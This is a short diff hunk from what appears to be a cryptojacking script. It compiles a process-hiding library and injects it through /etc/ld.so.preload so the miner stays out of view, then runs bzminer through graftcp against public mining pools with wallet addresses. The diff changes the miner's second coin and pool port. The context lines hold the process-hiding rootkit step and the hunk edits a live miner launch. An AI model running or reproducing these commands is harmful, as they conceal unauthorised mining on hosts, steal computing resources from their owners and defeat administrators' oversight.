@@ -43,4 +43,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bzminer -a kawpow -w RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g -p stratum+tcp://rvn.2miners.com:6060 --a2 kaspa --p2 stratum+tcp://pool.us.woolypooly.com:3112 --w2 kaspa:qqjgh3lff277858uhn7upgpl4xlmqkhwry33wg0vfjxhnxexap8gywc62xf3f
+./graftcp/graftcp ./bzminer -a kawpow -w RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g -p stratum+tcp://rvn.2miners.com:6060 --a2 ergo --p2 stratum+tcp://pool.us.woolypooly.com:3100 --w2 9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G
